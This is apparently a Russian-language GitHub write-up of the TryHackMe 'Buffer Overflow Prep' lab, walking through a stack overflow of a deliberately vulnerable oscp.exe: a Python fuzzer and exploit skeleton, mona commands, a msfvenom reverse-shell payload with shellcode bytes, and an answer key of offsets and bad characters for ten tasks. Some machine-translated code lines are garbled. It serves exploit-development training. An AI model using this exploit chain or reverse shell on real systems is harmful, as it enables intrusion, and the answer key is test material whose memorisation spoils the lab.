[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Buffer Overflow Prep](https://tryhackme.com/r/room/bufferoverflowprep) 

Всего 11 заданий:
## Задание 1
В этой комнате используется 32-битная виртуальная машина Windows 7 с предустановленными Immunity Debugger и Putty. 
Брандмауэр Windows и Defender отключены, чтобы упростить написание эксплойтов. 

Вы можете войти в систему с помощью RDP, используя следующие учетные данные:  `admin/password`

Я предлагаю использовать команду xfreerdp: `xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea /tls-seclevel:0`

Если Windows предложит вам выбрать местоположение вашей сети, выберите вариант «Домашняя».

На вашем рабочем столе должна быть папка с названием "vulnerable-apps". Внутри этой папки находится ряд двоичных 
файлов, которые уязвимы к простым переполнению буфера на основе стека (тип, которому учат на курсе PWK/OSCP): 
- Установщик SLMail.
- Двоичный код черепной коробки.
- Двоичный файл dostackbufferoverflowgood.
- Двоичный файл vulnserver.

Специально написанный двоичный файл «oscp», содержащий 10 переполнений буфера, каждое из которых имеет разное 
смещение EIP и набор плохих символов. 
Я также написал удобное руководство по эксплуатации переполнений буфера с помощью mona:  https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

Обратите внимание, что эта комната не обучает переполнению буфера с нуля. Она предназначена для помощи студентам 
OSCP, а также для привлечения их внимания к некоторым функциям mona, которые сэкономят время на экзамене OSCP. 

Спасибо  @Mojodojo_101  за помощь в создании специального двоичного файла oscp.exe для этой комнаты!

Ответить на вопросы ниже
Разверните виртуальную машину и войдите в систему с помощью RDP.
```commandline
Ответ не нужен
```

## Задание 2
Щелкните правой кнопкой мыши значок Immunity Debugger на рабочем столе и выберите «Запуск от имени администратора».

Когда Immunity загрузится, щелкните значок открытого файла или выберите Файл -> Открыть. Перейдите в папку уязвимых 
приложений на рабочем столе администратора, а затем в папку "oscp". Выберите двоичный файл "oscp" (oscp.exe) и 
щелкните "Открыть".  

Двоичный файл откроется в состоянии «паузы», поэтому щелкните красный значок воспроизведения или выберите Debug -> 
Run. В окне терминала двоичный файл oscp.exe должен быть запущен и сообщает нам, что он прослушивает порт 1337. 

На вашем компьютере с Kali подключитесь к порту 1337 на MACHINE_IP с помощью netcat:

`nc MACHINE_IP 1337`

Введите "HELP" и нажмите Enter. Обратите внимание, что существует 10 различных команд OVERFLOW, пронумерованных от 1 
до 10. Введите "OVERFLOW1 test" и нажмите Enter. Ответ должен быть "OVERFLOW1 COMPLETE". Завершите соединение. 

### Конфигурация Моны

Скрипт mona предустановлен, однако, чтобы с ним было проще работать, следует настроить рабочую папку с помощью 
следующей команды, которую можно запустить в поле ввода команд в нижней части окна Immunity Debugger: 

`!mona config -set workingfolder c:\mona\%p`

### Фаззинг
Создайте на компьютере с Kali файл с именем fuzzer.py и следующим содержимым:
```commandline
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```
Запустите скрипт fuzzer.py с помощью python:python3 fuzzer.py

Фаззер будет отправлять все более длинные строки, состоящие из A. Если фаззер вызывает сбой сервера с одной из строк,
фаззер должен выйти с сообщением об ошибке. Запишите наибольшее количество отправленных байтов. 

Репликация сбоев и контроль EIP

Создайте еще один файл на компьютере с Kali под названием explore.py со следующим содержимым:

```commandline
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```


Выполните следующую команду, чтобы создать циклический шаблон длиной на 400 байт больше, чем строка, вызвавшая сбой 
сервера (измените значение -lна это): 

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`

Если вы используете AttackBox, используйте следующий путь pattern_create.rb(не забудьте также изменить -l значение):

`/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 600`

Скопируйте вывод и поместите его в переменную payload скрипта explore.py.

В Windows, в Immunity Debugger, снова откройте oscp.exe, используя тот же метод, что и раньше, и щелкните красный 
значок воспроизведения, чтобы запустить его. Вам придется делать это перед каждым запуском Exploit.py (который мы 
запустим несколько раз с постепенными изменениями).  

На Kali запустите измененный скрипт `explore.py:python3 exploit.py`

Скрипт должен снова привести к краху сервера oscp.exe. На этот раз в Immunity Debugger в поле ввода команд в нижней 
части экрана выполните следующую команду mona, изменив расстояние на ту же длину, что и созданный вами шаблон: 

`!mona findmsp -distance 600`

Mona должна отобразить окно журнала с выводом команды. Если нет, щелкните меню «Окно», а затем «Данные журнала», 
чтобы просмотреть его (выберите «ЦП», чтобы вернуться к стандартному виду). 

В этом выводе вы должны увидеть строку, которая гласит:

`EIP contains normal pattern : ... (offset XXXX)`

Обновите скрипт explore.py и установите переменную offset на это значение (ранее было установлено на 0). Установите 
переменную payload снова на пустую строку. Установите переменную retn на "BBBB". 

Перезапустите oscp.exe в Immunity и снова запустите измененный скрипт explore.py. Регистр EIP теперь должен быть 
перезаписан 4 B (например, 42424242). 

Поиск плохих персонажей

Сгенерируйте bytearray с помощью mona и исключите нулевой байт (\x00) по умолчанию. Обратите внимание на 
местоположение сгенерированного файла bytearray.bin (если рабочая папка была установлена в соответствии с разделом 
«Конфигурация Mona» этого руководства, то местоположение должно быть `C:\mona\oscp\bytearray.bin`).  

`!mona bytearray -b "\x00"`

Теперь сгенерируйте строку плохих символов, которая идентична bytearray. Следующий скрипт python можно использовать 
для генерации строки плохих символов от \x01 до \xff: 

для x в диапазоне (1, 256):
  print("\\x" + "{:02x}".format(x), end='')
Распечатать()

Обновите скрипт explore.py и установите переменную полезной нагрузки на строку недопустимых символов, которую 
генерирует скрипт. 

Перезапустите oscp.exe в Immunity и снова запустите измененный скрипт explore.py. Запишите адрес, на который 
указывает регистр ESP, и используйте его в следующей команде mona: 

!mona compare -f C:\mona\oscp\bytearray.bin -a <address>

Должно появиться всплывающее окно с надписью "mona Memory comparison results". Если нет, используйте меню Window, 
чтобы переключиться на него. В окне отображаются результаты сравнения, указывающие любые символы, которые в памяти 
отличаются от тех, что находятся в сгенерированном файле bytearray.bin.  

Не все из них могут быть плохими символами! Иногда плохие символы приводят к повреждению следующего байта или даже 
влияют на остальную часть строки. 

Первый плохой символ в списке должен быть нулевым байтом (\x00), так как мы уже удалили его из файла. Запишите все 
остальные. Создайте новый bytearray в mona, указав эти новые плохие символы вместе с \x00. Затем обновите переменную 
payload в вашем скрипте explore.py и также удалите новые плохие символы.  

Перезапустите oscp.exe в Immunity и снова запустите измененный скрипт explore.py. Повторяйте сравнение badchar, пока 
статус результатов не вернет "Unmodified". Это означает, что больше не существует badchar. 

Нахождение точки перехода

Когда oscp.exe запущен или находится в аварийном состоянии, выполните следующую команду mona, обязательно обновив 
параметр -cpb всеми обнаруженными вами символами badchars (включая \x00): 

`!mona jmp -r esp -cpb "\x00"`

Эта команда находит все инструкции "jmp esp" (или эквивалентные) с адресами, которые не содержат ни одного из 
указанных плохих символов. Результаты должны отображаться в окне "Log data" (используйте меню Window, чтобы 
переключиться на него, если необходимо).  

Выберите адрес и обновите свой скрипт explore.py, установив переменную "retn" на адрес, записанный в обратном 
порядке (так как система имеет прямой порядок байтов). Например, если адрес в Immunity — \x01\x02\x03\x04, запишите 
его в своем эксплойте как \x04\x03\x02\x01.  

Генерация полезной нагрузки

Запустите следующую команду msfvenom на Kali, используя ваш IP-адрес Kali VPN в качестве LHOST и обновив параметр -b 
всеми идентифицированными вами символами badchars (включая \x00): 

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c`

Скопируйте сгенерированные строки кода C и интегрируйте их в переменную полезной нагрузки скрипта explore.py, 
используя следующую запись: 

```commandline
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```


Добавить NOP-ы

Поскольку для генерации полезной нагрузки, скорее всего, использовался кодировщик, вам понадобится некоторое 
пространство в памяти для распаковки полезной нагрузки. Вы можете сделать это, установив переменную padding на 
строку из 16 или более байтов "No Operation" (\x90):  

padding = "\x90" * 16
Эксплуатируйте!

Указав правильный префикс, смещение, адрес возврата, заполнение и полезную нагрузку, вы теперь можете использовать 
переполнение буфера для получения обратного шелла. 

Запустите прослушиватель netcat на вашем компьютере с Kali, используя LPORT, указанный вами в команде msfvenom (4444,
если вы его не изменили). 

Перезапустите oscp.exe в Immunity и снова запустите измененный скрипт explore.py. Ваш прослушиватель netcat должен 
поймать обратный шелл! 

### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW1?
```commandline
1978
```
Каковы были плохие символы для OVERFLOW1 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x07\x2e\xa0
```

## Задание 3
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW2.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW2?
```commandline
634
```
Каковы были плохие символы для OVERFLOW2 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x23\x3c\x83\xba
```

## Задание 4
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW3.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW3?
```commandline
1274
```
Каковы были плохие символы для OVERFLOW3 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x11\x40\x5F\xb8\xee
```

## Задание 5
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW4.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW4?
```commandline
2026
```
Каковы были плохие символы для OVERFLOW4 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\xa9\xcd\xd4
```

## Задание 6
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW5.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW5?
```commandline
314
```
Каковы были плохие символы для OVERFLOW5 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x16\x2f\xf4\xfd
```

## Задание 7
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW6.
### Ответить на вопросы ниже

Каково смещение EIP для OVERFLOW6?
```commandline
1034
```
Каковы были плохие символы для OVERFLOW6 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x08\x2c\xad
```

## Задание 8
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW7.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW7?
```commandline
1306
```
Каковы были плохие символы для OVERFLOW7 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x8c\xae\xbe\xfb
```

## Задание 9
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW8.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW8?
```commandline
1786
```
Каковы были плохие символы для OVERFLOW8 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x1d\x2e\xc7\xee
```

## Задание 10
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW9.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW9?
```commandline
1514
```
Каковы были плохие символы для OVERFLOW9 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\x04\x3e\x3f\xe1
```

## Задание 11
Повторите шаги, описанные в Задаче 2, но для команды OVERFLOW10.
### Ответить на вопросы ниже
Каково смещение EIP для OVERFLOW10?
```commandline
537
```
Каковы были плохие символы для OVERFLOW10 в порядке байтов (например, \x00\x01\x02) и включая нулевой байт \x00?
```commandline
\x00\xa0\xad\xbe\xde\xef
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)